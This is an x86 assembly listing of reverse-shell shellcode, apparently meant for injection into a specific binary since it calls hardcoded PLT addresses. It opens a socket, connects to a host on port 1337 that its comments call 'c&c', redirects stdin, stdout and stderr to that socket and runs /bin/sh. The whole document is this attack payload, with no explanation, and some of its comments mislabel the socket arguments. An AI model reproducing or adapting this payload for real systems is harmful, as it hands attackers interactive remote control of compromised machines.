#prologue
add    esp, 600
lea    ecx,[esp+0x4]
and    esp,0xfffffff0
push   DWORD PTR [ecx-0x4]
push   ebp
mov    ebp,esp
push   ecx
sub    esp,0x34
mov    eax,ecx
mov    eax,DWORD PTR [eax+0x4]
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,gs:0x14
mov    DWORD PTR [ebp-0xc],eax
xor    eax,eax
mov    WORD PTR [ebp-0x1c],0x2
sub    esp,0xc
push   0x539

# call host to network on port
mov    eax , 0x08048640
call   eax #<htons@plt>

add    esp,0x10
mov    WORD PTR [ebp-0x1a],ax
sub    esp,0xc
# set host with inet_address struct
call   get_host
   .string "127.0.0.1"
get_host:
mov    eax, 0x08048740
call   eax #<inet_addr@plt>

add    esp,0x10
mov    DWORD PTR [ebp-0x18],eax
sub    esp,0x4
push   0x0 #stdin
push   0x1 #stdout
push   0x2 #stderr

# init client socket
mov eax, 0x08048730
call   eax #<socket@plt>

add    esp,0x10
mov    DWORD PTR [ebp-0x28],eax
sub    esp,0x4
push   0x10
lea    eax,[ebp-0x1c]
push   eax
push   DWORD PTR [ebp-0x28]

# connect to c&c
mov eax, 0x08048750
call   eax #<connect@plt>

add    esp,0x10
sub    esp,0x8
push   0x0
push   DWORD PTR [ebp-0x28]

# redirect stdin to socket
mov eax, 0x08048600
call   eax #<dup2@plt>


add    esp,0x10
sub    esp,0x8
push   0x1
push   DWORD PTR [ebp-0x28]


# redirect stdout to socket
mov eax, 0x08048600
call   eax #<dup2@plt>

add    esp,0x10
sub    esp,0x8
push   0x2
push   DWORD PTR [ebp-0x28]

# redirect stderr to socket
mov eax, 0x08048600
call   eax #<dup2@plt>

#put bin_sh path in stack
call   get_bin_sh
   .string "/bin/sh"
get_bin_sh:


pop     ebx
xor     ecx, ecx #create NULL
push    ecx #push NULL to stack
mov     edx,esp #edx now points to NULL
push    ebx #push path to bin_sh to stack
mov     ecx, esp #put pointer to string in ecx

#execute bin_sh
mov     eax, 0x080486D0
call    eax #<execv@plt>
#close socket
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0x28]
call   0x08048770 #<close@plt>